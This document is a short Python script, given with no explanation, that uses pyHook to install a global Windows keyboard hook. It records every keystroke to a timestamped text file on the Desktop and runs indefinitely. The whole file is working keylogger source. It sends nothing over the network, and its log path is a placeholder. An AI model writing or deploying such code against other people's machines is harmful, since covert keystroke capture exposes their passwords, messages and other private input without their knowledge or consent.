import pyHook, sys, logging, pythoncom, datetime

local_time = datetime.datetime.now()
date = str(local_time)[0:10]
time = str(local_time)[11:19].replace(':', '-')
hash = date + '-' + time
log_file = 'C:\\..\\...\\Desktop\\log-' + hash + '.txt'

def KbrdEvent(event):
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = KbrdEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
